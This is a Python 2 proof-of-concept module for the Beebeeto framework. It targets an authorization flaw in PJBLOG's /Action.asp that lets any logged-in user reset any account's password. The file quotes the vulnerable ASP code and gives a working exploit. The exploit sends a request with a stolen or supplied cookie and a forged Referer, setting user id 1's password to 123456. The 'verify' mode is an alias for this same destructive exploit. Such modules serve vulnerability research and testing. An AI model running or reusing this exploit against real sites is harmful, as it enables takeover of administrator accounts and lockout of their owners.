#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0185',
            'name': 'PJBLOG /Action.asp 修改任意用户密码 Exploit',
            'author': 'user1018',
            'create_date': '2014-12-09',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'PJBLOG',
            'vul_version': ['*'],
            'type': 'Remote Password Change',
            'tag': ['PJBLOG漏洞', '修改任意用户密码漏洞', '/Action.asp', 'asp'],
            'desc': '''
                    在文件Action.asp中：
                    ElseIf Request.QueryString("action") = "updatepassto" Then   //第307行
                        If ChkPost() Then
                            Dim e_Pass, e_RePass, e_ID, e_Rs, e_hash, d_pass
                            e_ID = CheckStr(UnEscape(Request.QueryString("id")))
                            e_Pass = CheckStr(UnEscape(Request.QueryString("pass")))
                            e_RePass = CheckStr(UnEscape(Request.QueryString("repass")))
                            Set e_Rs = Server.CreateObject("Adodb.Recordset")
                            e_Rs.open "Select * From [blog_Member] Where [mem_ID]="&e_ID, Conn, 1, 3
                                e_hash = e_Rs("mem_salt")
                                d_pass = SHA1(e_Pass&e_hash)
                                e_Rs("mem_Password") = d_pass
                                e_Rs.update
                            e_Rs.Close
                            Set e_Rs = nothing
                            response.Write("1")
                        Else
                            response.write lang.Err.info(999)
                        End If
                    程序在修改用户的密码时，没有对用户的合法权限做验证，导致攻击者可以修改任意用户的密码。
                    ''',
            'references': ['http://sebug.net/vuldb/ssvid-20648',
            ],
        },
    }

    def _init_user_parser(self):  # 定制命令行参数
        self.user_parser.add_option('-c','--cookie',
                                    action='store', dest='cookie', type='string', default=None,
                                    help='this poc need to login, so special cookie '
                                    'for target must be included in http headers.')

    @classmethod
    def exploit(cls, args):
        if args['options']['cookie'] == None:
            print 'Need to use the -c parameter'
            args['success'] = False
            return args

        # 修改referer绕过程序检测
        headers_cookie = {"Cookie":args['options']['cookie'], "Referer":args['options']['target']}
        verify_url = args['options']['target'] + '/action.asp?action=updatepassto&id=1&pass=123456&repass=test'
        req = urllib2.Request(verify_url, headers=headers_cookie)
        content = urllib2.urlopen(req).read()

        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url

        # 不能批量扫描，所以没有添加判断条件
        args['success'] = False
        args['poc_ret']['vul_url'] = verify_url
        return args

    verify = exploit


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())